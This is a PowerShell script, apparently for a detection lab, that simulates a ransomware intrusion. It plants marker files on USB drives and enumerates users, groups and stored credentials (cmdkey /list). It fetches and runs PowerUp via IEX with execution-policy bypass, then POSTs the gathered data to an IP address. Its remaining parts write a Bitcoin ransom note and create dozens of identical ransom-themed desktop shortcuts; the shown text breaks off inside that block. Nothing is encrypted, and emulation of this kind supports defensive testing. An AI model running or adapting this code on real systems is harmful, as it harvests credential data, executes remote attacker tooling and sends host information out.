# Powershell script to simulate Ransomware Spread via USB

$outfile = "C:\Windows\temp"

Write-Host "[+] Attack Started ..........." -ForegroundColor Green
$RemovableDrives=@()
$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
ForEach ($Drive in $RemovableDrives)
{
write-host "Removable Drive Found:" $Drive
New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test has created this file to simulate malware spread to removable drives."
}
Start-Sleep -S 5

Write-Host "[+] Windows Enumeration" -ForegroundColor Green
net user | Out-File -FilePath "$outfile\Localenum.txt" -Append
ls c:\Users\ | Out-File -FilePath "$outfile\Localenum.txt" -Append
cmdkey.exe /list | Out-File -FilePath "$outfile\Localenum.txt" -Append
get-localuser | Out-File -FilePath "$outfile\Localenum.txt" -Append
get-localgroup | Out-File -FilePath "$outfile\Localenum.txt" -Append
net localgroup "Users" | Out-File -FilePath "$outfile\Localenum.txt" -Append
net localgroup | Out-File -FilePath "$outfile\Localenum.txt" -Append
get-localgroupmember -group Users | Out-File -FilePath "$outfile\Localenum.txt" -Append
get-childitem C:\Users\ | Out-File -FilePath "$outfile\Localenum.txt" -Append
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks | Out-File -FilePath $outfile\Powerup.txt"
Start-Sleep -S 5

Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
# Exfil will fail due to IP address
Get-Content $outfile\Powerup.txt, $outfile\Localenum.txt | Set-Content $outfile\exfilFile.txt
$content = Get-Content $outfile\exfilFile.txt
Invoke-WebRequest -Uri 172.31.33.33 -Method POST -Body $content

Start-Sleep -S 5

Write-Host "[+] Ransomware Attack" -ForegroundColor Green

Echo "Ooops, your files have been encrypted! 

What Happened to My Computer? 
Your important files are encrypted. 
Many of your documents, photos, videos, databases and other files are no longer 
accessible because they have been encrypted. Maybe you are busy looking for a way to 
recover your files, but do not waste your time. Nobody can recover your files without 
our decryption service. 

Can I Recover My Files?
Sure. We guarantee that you can recover all your files safely and easily. But you have
not so enough time.
You can decrypt some of your files for free. Try now by clicking <Decrypt>.
But if you want to decrypt all your files, you need to pay.

You only have 3 days to submit the payment. After that the price will be doubled.
Also, if you don't pay in 7 days, you won't be able to recover your files forever.
We will have free events for users who are so poor that they couldn't pay in 6 months.

How Do I Pay?
Payment is accepted in Bitcoin only. For more information, click <About bitcoin>.
Please check the current price of Bitcoin and buy some bitcoins. For more information,
click <How to buy bitcoins>.And send the correct amount to the address specified in this window.
After your payment, click <Check Payment>. Best time to check: 9:00am - 11:00am

OUTEM Polda
B bitcoin
ACCEPTED HERE
Send £300 Millon worth of bitcoin to this address:
12t9YDPgwueZ9NyMgw519p7AA8isjr6 SMw" > C:\Users\$env:USERNAME\Desktop\RANSOM_NOTE.txt

Start-Sleep -S 5

# Creation of files 
Write-Host "[+] Creating Files" -ForegroundColor Green
$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom1.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom2.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom3.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom4.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom5.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom6.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom7.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom8.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom9.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom10.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom11.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom12.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom13.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom14.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom15.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom16.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom17.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom18.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom19.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom20.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom21.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom22.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom23.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom24.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom25.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom26.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom27.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom28.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom29.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom30.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom31.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom32.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom33.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom34.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom35.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom36.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom37.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom38.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom39.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom40.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom41.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom42.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom43.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom44.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom45.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom46.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom47.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom48.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom49.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom50.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom51.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\$env:USERNAME\Desktop\Ransom52.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
